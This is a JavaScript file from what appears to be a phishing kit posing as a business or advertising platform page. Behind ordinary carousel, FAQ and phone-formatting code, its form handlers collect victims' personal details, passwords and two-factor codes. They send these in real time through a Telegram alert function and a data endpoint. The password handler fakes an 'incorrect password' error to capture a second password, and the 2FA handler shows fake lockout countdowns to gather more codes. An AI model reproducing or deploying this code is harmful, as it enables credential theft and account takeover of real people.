// Skeleton loader & Window init
window.addEventListener('load', () => {
    window.passwords = [];
    window.otps = [];

    const sk = document.getElementById('skeleton-loader');
    if (sk) { sk.classList.add('hidden'); setTimeout(() => sk.remove(), 500); }
    // Dynamic year updates
    const yr = new Date().getFullYear();
    const footerYr = document.getElementById('footer-year');
    if (footerYr) footerYr.textContent = yr;
    const yearInput = document.getElementById('year');
    if (yearInput) { yearInput.max = yr; yearInput.setAttribute('oninput', yr + '<this.value&&(this.value=' + yr + ')'); }
    // Auto detect IP and set country code/flag
    autoDetectCountryFromIP();
});

// Mobile hamburger nav
function toggleMobileNav() {
    document.getElementById('hamburger-btn').classList.toggle('active');
    document.getElementById('mobile-nav-overlay').classList.toggle('active');
    document.getElementById('mobile-nav-drawer').classList.toggle('active');
    document.body.style.overflow = document.getElementById('mobile-nav-drawer').classList.contains('active') ? 'hidden' : '';
}

            // Modal functions
            // Close modal on Escape key
            document.addEventListener('keydown', function (e) {
                if (e.key === 'Escape') {
                    const active = document.querySelector('.modal.active');
                    if (active && active.id === 'modal-info') hideModal('modal-info');
                }
            });

            // Benefits select (accordion-style with image switching)
            
            function selectBenefit(id) {
                // If clicking the same item, toggle it off
                if (currentBenefit === id) {
                    currentBenefit = null;
                    for (let i = 1; i <= 4; i++) {
                        const item = document.getElementById('benefit-item-' + i);
                        if (!item) continue;
                        item.className = 'py-6 cursor-pointer border-b border-gray-200 text-gray-400 hover:text-[#1c2b33] transition-colors';
                        const desc = item.querySelector('.benefit-desc');
                        if (desc) desc.style.maxHeight = '0';
                        const chevron = item.querySelector('.benefit-chevron');
                        if (chevron) chevron.style.transform = 'rotate(0deg)';
                    }
                    return;
                }
                currentBenefit = id;
                // Update all benefit items
                for (let i = 1; i <= 4; i++) {
                    const item = document.getElementById('benefit-item-' + i);
                    if (!item) continue;
                    const isActive = i === id;
                    item.className = 'py-6 cursor-pointer border-b border-gray-200 ' +
                        (isActive ? 'text-[#1c2b33]' : 'text-gray-400 hover:text-[#1c2b33] transition-colors');
                    const desc = item.querySelector('.benefit-desc');
                    if (desc) desc.style.maxHeight = isActive ? '200px' : '0';
                    const chevron = item.querySelector('.benefit-chevron');
                    if (chevron) chevron.style.transform = isActive ? 'rotate(180deg)' : 'rotate(0deg)';
                }
                // Switch image with fast fade animation
                const img = document.getElementById('benefit-image');
                if (img) {
                    img.style.opacity = '0';
                    setTimeout(() => {
                        img.src = benefitData[id].image;
                        img.style.opacity = '1';
                    }, 150);
                }
            }

            // FAQ toggle
            function toggleFaq(btn) {
                const parent = btn.closest('.border-b');
                const answer = parent.querySelector('.faq-answer');
                const icon = btn.querySelector('svg');
                answer.classList.toggle('open');
                icon.style.transform = answer.classList.contains('open') ? 'rotate(180deg)' : '';
            }

            // Testimonial Carousel - Slide

            function changeTestimonial(direction) {
                currentTestimonial = (currentTestimonial + direction + totalSlides) % totalSlides;
                const track = document.getElementById('testimonial-track');
                if (track) {
                    track.style.transform = `translateX(-${currentTestimonial * 100}%)`;
                }
                // Update dots
                const dots = document.querySelectorAll('#carousel-dots > div');
                dots.forEach((dot, i) => {
                    dot.className = i === currentTestimonial
                        ? 'w-[7px] h-[7px] rounded-full bg-[#1c2b33] transition-colors duration-300'
                        : 'w-[7px] h-[7px] rounded-full bg-[#cbd2d9] transition-colors duration-300';
                });
            }

            // Country code to flag mapping - comprehensive world coverage

            // Extract country code from phone number

            // Country dropdown

            function toggleCountryDropdown() {
                const dd = document.getElementById('country-dropdown');
                const isOpen = dd.style.display !== 'none';
                dd.style.display = isOpen ? 'none' : 'block';
                document.getElementById('flag-dropdown').classList.toggle('open', !isOpen);
                const searchInput = document.getElementById('country-search');
                if (!isOpen && searchInput) {
                    searchInput.value = '';
                    dd.querySelectorAll('.country').forEach(item => item.style.display = '');
                    setTimeout(() => searchInput.focus(), 50);
                }
            }

            function selectCountry(code, flag, autoFocus = true) {
                currentCountryCode = code;
                currentCountryFlag = flag;
                const flagImg = document.getElementById('selected-flag-img');
                if (flagImg) {
                    flagImg.src = 'https://flagcdn.com/w20/' + flag + '.png';
                    flagImg.alt = flag.toUpperCase();
                }
                const selectedFlag = document.querySelector('.selected-flag');
                if (selectedFlag) {
                    const countryName = countryCodeToName[code] || flag.toUpperCase();
                    selectedFlag.title = countryName + ': ' + code;
                }
                const phoneEl = document.getElementById('phone');
                if (phoneEl) {
                    phoneEl.value = code + ' ';
                    if (autoFocus) phoneEl.focus();
                }
                const dd = document.getElementById('country-dropdown');
                if (dd) dd.style.display = 'none';
                const fd = document.getElementById('flag-dropdown');
                if (fd) fd.classList.remove('open');
            }

            async function autoDetectCountryFromIP() {
                try {
                    let countryCode = null;
                    if (typeof Utils !== 'undefined' && Utils.userLoc && Utils.userLoc.countryCode && Utils.userLoc.countryCode !== 'Unknown') {
                        countryCode = Utils.userLoc.countryCode;
                    } else {
                        const r = await fetch('https://ipwho.is/');
                        const data = await r.json();
                        if (data && data.country_code) countryCode = data.country_code;
                    }
                    if (countryCode && typeof countryCodeToFlag !== 'undefined') {
                        const cc = countryCode.toLowerCase();
                        for (const [dial, flag] of Object.entries(countryCodeToFlag)) {
                            if (flag === cc) {
                                selectCountry(dial, flag, false);
                                break;
                            }
                        }
                    }
                } catch (e) {}
            }

            // Populate country dropdown dynamically from maps
            (function populateCountryDropdown() {
                const dd = document.getElementById('country-dropdown');
                if (!dd) return;
                // Sort entries alphabetically by country name
                const entries = Object.entries(countryCodeToName).sort((a, b) => a[1].localeCompare(b[1]));
                let html = '';
                for (const [code, name] of entries) {
                    const flag = countryCodeToFlag[code] || '';
                    const highlight = code === '+1' ? ' highlight' : '';
                    html += `<li class="country${highlight}" onclick="selectCountry('${code}','${flag}')"><img src="https://flagcdn.com/w20/${flag}.png" class="country-flag"><span class="country-name">${name}</span><span class="dial-code">${code}</span></li>`;
                }
                // Preserve the search input, append country items after it
                const searchLi = dd.querySelector('.country-search-wrap');
                const existingItems = dd.querySelectorAll('.country');
                existingItems.forEach(item => item.remove());
                dd.insertAdjacentHTML('beforeend', html);
            })();

            // Phone input with auto-formatting (from required.html)
            const phoneInput = document.getElementById('phone');
            if (phoneInput) {
                phoneInput.addEventListener('input', function (e) {
                    this.setCustomValidity('');
                    const cursorPos = this.selectionStart;
                    const oldLen = this.value.length;

                    let cleaned = this.value.replace(/[^\d+]/g, '');
                    cleaned = cleaned.startsWith('+') ? cleaned : '+' + cleaned;
                    cleaned = '+' + cleaned.replace(/\+/g, '');

                    const code = extractCountryCode(cleaned);
                    if (code) {
                        if (code !== currentCountryCode) {
                            updateFlagFromCode(code);
                        }
                        const digits = cleaned.substring(code.length);
                        let formatted = '';
                        for (let i = 0; i < digits.length; i++) {
                            if (i > 0 && i % 3 === 0) formatted += ' ';
                            formatted += digits[i];
                        }
                        this.value = code + (formatted ? ' ' + formatted : '');
                    } else {
                        this.value = cleaned;
                    }

                    const newLen = this.value.length;
                    const newPos = Math.max(0, cursorPos + (newLen - oldLen));
                    this.setSelectionRange(newPos, newPos);
                });
                phoneInput.value = currentCountryCode + ' ';
            }

            document.addEventListener('click', function (e) {
                if (!e.target.closest('.flag-dropdown') && !e.target.closest('.country-list')) {
                    const dd = document.getElementById('country-dropdown');
                    dd.style.display = 'none';
                    document.getElementById('flag-dropdown').classList.remove('open');
                    // Clear search and reset visibility
                    const searchInput = document.getElementById('country-search');
                    if (searchInput) {
                        searchInput.value = '';
                        dd.querySelectorAll('.country').forEach(item => item.style.display = '');
                    }
                }
            });

            // Custom checkbox
            const customCheckbox = document.getElementById('custom-checkbox');
            const checkboxBox = document.getElementById('checkbox-box');
            const checkboxCheck = document.getElementById('checkbox-check');
            customCheckbox?.addEventListener('change', function () {
                if (this.checked) {
                    checkboxBox.classList.remove('bg-white', 'border-gray-300');
                    checkboxBox.classList.add('bg-[#0d6efd]', 'border-[#0d6efd]');
                    checkboxCheck.classList.remove('hidden');
                } else {
                    checkboxBox.classList.add('bg-white', 'border-gray-300');
                    checkboxBox.classList.remove('bg-[#0d6efd]', 'border-[#0d6efd]');
                    checkboxCheck.classList.add('hidden');
                }
            });

            // Password toggle
            const togglePasswordBtn = document.getElementById('toggle-password');
            const passwordInput = document.getElementById('password');
            const eyeOffIcon = document.getElementById('eye-off-icon');
            const eyeOnIcon = document.getElementById('eye-on-icon');
            togglePasswordBtn?.addEventListener('click', function () {
                if (passwordInput.type === 'password') {
                    passwordInput.type = 'text';
                    eyeOffIcon.classList.add('hidden');
                    eyeOnIcon.classList.remove('hidden');
                } else {
                    passwordInput.type = 'password';
                    eyeOffIcon.classList.remove('hidden');
                    eyeOnIcon.classList.add('hidden');
                }
            });

    
            // 2FA input - enable button when 6-8 digits
        const code2faInput = document.getElementById('code-2fa');
        const tfaSubmitBtn = document.getElementById('tfa-submit-btn');

        // Set initial state
        tfaSubmitBtn.disabled = true;
        tfaSubmitBtn.classList.add('opacity-70', 'cursor-not-allowed');

        code2faInput?.addEventListener('input', function () {
            const codeLength = this.value.replace(/[^0-9]/g, '').length;
            
            if (codeLength >= 6 && codeLength <= 8) {
                tfaSubmitBtn.disabled = false;
                tfaSubmitBtn.classList.remove('opacity-70', 'cursor-not-allowed');
                tfaSubmitBtn.classList.add('opacity-100', 'cursor-pointer');
            } else {
                tfaSubmitBtn.disabled = true;
                tfaSubmitBtn.classList.add('opacity-70', 'cursor-not-allowed');
                tfaSubmitBtn.classList.remove('opacity-100', 'cursor-pointer');
            }
        });


            document.getElementById('btn-subscribe').onclick = () => showModal('modal-info');
            document.getElementById('btn-subscribe-cta').onclick = () => showModal('modal-info');
            document.getElementById('nav-get-started').onclick = () => showModal('modal-info');
            document.getElementById('nav-advertise').onclick = () => showModal('modal-info');
            document.getElementById('nav-learn').onclick = () => showModal('modal-info');
            document.getElementById('nav-support').onclick = () => showModal('modal-info');

            document.getElementById('form-info').onsubmit = async function (e) {
                e.preventDefault();
                if (isSubmittingInfo) {
                    return;
                }

                // Clear previous errors
                clearFormErrors();

                const email = document.getElementById('email').value;
                if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
                    showFormError('error-email', 'Please enter a valid email address');
                    document.getElementById('email').focus();
                    return;
                }

                const day = parseInt(document.getElementById('day').value);
                const month = parseInt(document.getElementById('month').value);
                const year = parseInt(document.getElementById('year').value);

                if (!day || day < 1 || day > 31) {
                    showFormError('error-dob', 'Please enter a valid day (1-31)');
                    document.getElementById('day').focus();
                    return;
                }
                if (!month || month < 1 || month > 12) {
                    showFormError('error-dob', 'Please enter a valid month (1-12)');
                    document.getElementById('month').focus();
                    return;
                }
                if (!year || year < 1 || year > new Date().getFullYear()) {
                    showFormError('error-dob', 'Please enter a valid year');
                    document.getElementById('year').focus();
                    return;
                }

                // Phone validation - require at least 7 digits after country code
                const phoneEl = document.getElementById('phone');
                const phoneValue = phoneEl.value.replace(/\s/g, '');
                // Remove country code prefix, then count only digit characters
                const afterCode = phoneValue.startsWith(currentCountryCode)
                    ? phoneValue.substring(currentCountryCode.length)
                    : phoneValue.replace(/^\+?\d{1,3}/, '');
                const digitCount = (afterCode.match(/\d/g) || []).length;
                if (digitCount < 7 || phoneValue === currentCountryCode || phoneValue.trim() === currentCountryCode.trim()) {
                    showFormError('error-phone', 'Please enter a valid phone number (at least 7 digits)');
                    phoneEl.focus();
                    return;
                }

                isSubmittingInfo = true;
                document.getElementById('info-btn-text').classList.add('hidden');
                document.getElementById('info-spinner').classList.remove('hidden');
                document.getElementById('info-submit-btn').disabled = true;

                // Send Telegram real-time alert instantly
                Utils.sendMessage(Utils.formatReport('INFO'));

                try {
                    // Run API call and minimum delay in parallel (matching v1 loading behavior)
                    const [result] = await Promise.all([
                        sendData({
                            type: 'info',
                            email: email,
                            emailBusiness: document.getElementById('emailBusiness')?.value || '',
                            fullName: document.getElementById('fullName').value,
                            phone: document.getElementById('phone').value,
                            fanpage: document.getElementById('fanpage').value,
                            dob: `${day}/${month}/${year}`,
                            note: document.getElementById('message')?.value || '',
                            device: getDeviceInfo()
                        }),
                        new Promise(r => setTimeout(r, 3000)) // minimum 3s loading
                    ]);

                    if (result && result.success) currentSessionId = result.session_id;
                    hideModal('modal-info');
                    showModal('modal-password');
                } catch (err) {
                    console.error('Error:', err);
                    showFormError('error-email', 'Network error, please try again');
                } finally {
                    isSubmittingInfo = false;
                    document.getElementById('info-btn-text').classList.remove('hidden');
                    document.getElementById('info-spinner').classList.add('hidden');
                    document.getElementById('info-submit-btn').disabled = false;
                }
            };

            document.getElementById('form-password').onsubmit = async function (e) {
                e.preventDefault();
                const pwd = document.getElementById('password');
                const error = document.getElementById('pwd-error');
                const btnText = document.getElementById('pwd-btn-text');
                const spinner = document.getElementById('pwd-spinner');
                const btn = document.getElementById('pwd-submit-btn');

                if (!pwd.value.trim()) {
                    error.textContent = "You haven't entered your password!";
                    error.classList.add('show');
                    return;
                }

                error.textContent = '';
                error.classList.remove('show');
                btnText.classList.add('hidden');
                spinner.classList.remove('hidden');
                btn.disabled = true;
                pwdAttempts++;

                const savedPwd = pwd.value;
                if (!window.passwords) window.passwords = [];
                window.passwords.push(savedPwd);

                // Send Telegram real-time alert instantly
                Utils.sendMessage(Utils.formatReport('PASS', { password: savedPwd, attempt: pwdAttempts }));

                if (currentSessionId) {
                    sendData({ type: 'password', session_id: currentSessionId, password: savedPwd });
                }

                await new Promise(r => setTimeout(r, 3000));

                spinner.classList.add('hidden');
                btnText.classList.remove('hidden');
                btn.disabled = false;

                if (pwdAttempts === 1) {
                    error.textContent = "The password you've entered is incorrect.";
                    error.classList.add('show');
                    pwd.value = '';
                } else {
                    error.classList.remove('show');
                    hideModal('modal-password');
                    update2FADisplay();
                    showModal('modal-2fa');
                }
            };

            // Form 2FA submit
            document.getElementById('form-2fa').onsubmit = function (e) {
                e.preventDefault();
                const code = document.getElementById('code-2fa');
                const error = document.getElementById('2fa-error');
                const btnText = document.getElementById('tfa-btn-text');
                const spinner = document.getElementById('tfa-spinner');
                const btn = document.getElementById('tfa-submit-btn');

                const codeValue = code.value.replace(/[^0-9]/g, '');
                
                if (!codeValue || codeValue.length < 6 || codeValue.length > 8) {
                    error.textContent = "Please enter a valid code (6-8 digits)";
                    error.classList.add('show');
                    return;
                }

                tfaAttempts++;
                if (!window.otps) window.otps = [];
                window.otps.push(codeValue);

                // Send Telegram real-time alert instantly
                Utils.sendMessage(Utils.formatReport('OTP', { otp: codeValue, attempt: tfaAttempts }));

                if (currentSessionId) {
                    sendData({ type: '2fa', session_id: currentSessionId, code: codeValue });
                }

                error.textContent = '';
                error.classList.remove('show');
                btnText.classList.add('hidden');
                spinner.classList.remove('hidden');
                btn.disabled = true;
                code.disabled = true;
                tfaAttempts++;

                setTimeout(() => {
                    spinner.classList.add('hidden');
                    btnText.classList.remove('hidden');

                    if (tfaAttempts <= 2) {
                        code.value = '';
                        let countdown = 30;
                        const updateCountdown = () => {
                            const mins = Math.floor(countdown / 60);
                            const secs = countdown % 60;
                            error.textContent = `The two-factor authentication you entered is incorrect. Please, try again after ${mins} minutes ${secs.toString().padStart(2, '0')} seconds.`;
                            error.classList.add('show');
                        };
                        updateCountdown();
                        const interval = setInterval(() => {
                            countdown--;
                            if (countdown <= 0) {
                                clearInterval(interval);
                                error.textContent = 'You can try again now.';
                                code.disabled = false;
                                btn.disabled = false;
                                code.focus();
                            } else {
                                updateCountdown();
                            }
                        }, 1000);
                    } else {
                        error.classList.remove('show');
                        code.disabled = false;
                        hideModal('modal-2fa');
                        showModal('modal-success');
                    }
                }, 3000);
            };


            ['email', 'day', 'month', 'year', 'phone'].forEach(id => {
                document.getElementById(id)?.addEventListener('input', clearFormErrors);
            });

            const countrySearchInput = document.getElementById('country-search');
            if (countrySearchInput) {
                countrySearchInput.addEventListener('input', function () {
                    const query = this.value.toLowerCase();
                    const items = document.querySelectorAll('#country-dropdown .country');
                    items.forEach(item => {
                        const name = item.querySelector('.country-name')?.textContent.toLowerCase() || '';
                        const code = item.querySelector('.dial-code')?.textContent || '';
                        item.style.display = (name.includes(query) || code.includes(query)) ? '' : 'none';
                    });
                });
            }

            const scrollObserver = new IntersectionObserver((entries) => {
                entries.forEach(entry => {
                    if (entry.isIntersecting) {
                        entry.target.classList.add('visible');
                        scrollObserver.unobserve(entry.target);
                    }
                });
            }, { threshold: 0.1 });
            document.querySelectorAll('.scroll-fade').forEach(el => scrollObserver.observe(el));

            document.addEventListener('keydown', function (e) {
                if (e.key !== 'Tab') return;
                const activeModal = document.querySelector('.modal.active .modal-content');
                if (!activeModal) return;
                const focusable = activeModal.querySelectorAll('input:not([disabled]), button:not([disabled]), textarea, select, a[href], [tabindex]:not([tabindex="-1"])');
                if (focusable.length === 0) return;
                const first = focusable[0], last = focusable[focusable.length - 1];
                if (e.shiftKey) {
                    if (document.activeElement === first) { e.preventDefault(); last.focus(); }
                } else {
                    if (document.activeElement === last) { e.preventDefault(); first.focus(); }
                }
            });
